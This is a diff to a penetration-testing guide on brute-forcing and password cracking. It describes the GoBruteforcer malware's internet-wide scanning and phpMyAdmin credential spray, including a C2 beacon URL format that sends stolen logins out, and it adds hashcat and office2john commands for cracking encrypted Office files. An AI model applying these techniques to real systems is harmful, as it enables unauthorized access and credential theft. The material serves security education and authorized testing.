@@ -97,11 +97,13 @@ Finished in 0.920s.
 
 ## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
 
-- Maintain **architecture-tuned worker pools** (for example, ~95 goroutines on `x86_64/arm64`, ~85 on `i686`, ~50 on low-end ARM) and respawn every second to keep **fixed concurrency**, with each worker handling exactly one target IP before exiting.
-- Generate **random public IPv4s** but drop obvious honeypot-heavy or unroutable ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the remote dictionary/C2 fetch fails.
+The following behaviors were observed in the GoBruteforcer malware's scanning workflow; exact values are sample-specific.<sup>[[1]](#references)</sup>
+
+- Maintain **architecture-tuned worker pools** (for example, 95 concurrent workers on `x86_64/arm64`, 85 on `i686`, 35 on `armv5tel`, and 50 by default on other architectures), check active workers every second, and spawn replacements when below target; each worker handles at most one target IP before exiting.
+- Generate **random public IPv4s** but drop obvious unroutable and selected operator-avoided ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the C2 credential fetch fails.
 - **Exfiltrate hits** via tiny HTTP GET beacons such as `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes like `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) while reusing a common browser User-Agent to blend in.
-- **phpMyAdmin spray** can brute-force dozens of likely paths (~80+) with `GET /index.php?lang=en`, detect PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) and parse `codemirror.css?v=X.Y.Z` to branch auth: versions `<4.9` accept GET params `pma_username`/`pma_password`; versions `>=4.9` require POST with `server=1`, CSRF `token`, and the same creds.
+- **phpMyAdmin spray** can brute-force about 80 likely paths with `GET /index.php?lang=en`, detect PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) and parse `codemirror.css?v=X.Y.Z` to branch auth: versions `<4.9` accept GET params `pma_username`/`pma_password`; versions `>=4.9` use POST with `server=1`, CSRF `token`, and the same creds.
 
 ## Services
 
@@ -237,9 +239,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
 
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
@@ -823,6 +822,37 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
+#### Grammar-driven combinator attacks (encrypted Office example)
+
+A password can be long and contain several character classes while still having a small **effective search space** when it follows a known grammar. For an encrypted Office document obtained during an authorized assessment, `office2john.py` extracts the password-verification record; this enables local guessing without online lockouts, throttling, or MFA. It does not bypass the document encryption.<sup>[[2]](#references)[[5]](#references)</sup>
+
+Strip the filename field that John prepends so Hashcat receives only the verifier:<sup>[[2]](#references)</sup>
+
+```bash
+python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
+head -c 40 office.hash; echo
+```
+
+Select `-m` from the extracted prefix rather than from the file extension. Hashcat maps `$office$*2007*`, `$office$*2010*`, and `$office$*2013*` to modes `9400`, `9500`, and `9600`; legacy `$oldoffice$0/$1` and `$oldoffice$3/$4` records use modes `9700` and `9800`, respectively.<sup>[[3]](#references)</sup>
+
+If intelligence from password reuse, policies, hints, or people familiar with the user reveals a grammar such as `<word><number><optional !><word>`, materialize the independently enumerable prefix as the left dictionary. This example tests numbers `0` through `99`; replace the range and transformations with evidence from the assessment.<sup>[[5]](#references)</sup>
+
+```bash
+while IFS= read -r word; do
+  for number in $(seq 0 99); do
+    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
+  done
+done < words.txt > wordsAndNumbers.txt
+```
+
+Hashcat attack mode `1` appends every line of the right dictionary to every line of the left dictionary, so files containing `L` and `R` lines produce `L × R` candidates before any applied rules. The following command is specifically for a legacy `$oldoffice$3/$4` record; change the mode for other Office formats.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+
+```bash
+hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
+```
+
+This preprocessing pattern generalizes to other offline-verifiable formats: enumerate only plausible capitalization, dates, separators, digits, or punctuation for one component, then combine it with the remaining component instead of brute-forcing the nominal full length.<sup>[[4]](#references)[[5]](#references)</sup>
+
 - **Mask attack** (`-a 3`)
 
 ```bash
@@ -903,9 +933,10 @@ Cracking Common Application Hashes
 
 ## References
 
-- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
+- [3] [Hashcat example hashes and Microsoft Office modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [Estate planning of credentials](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
 
 {{#include ../banners/hacktricks-training.md}}
-
-
-
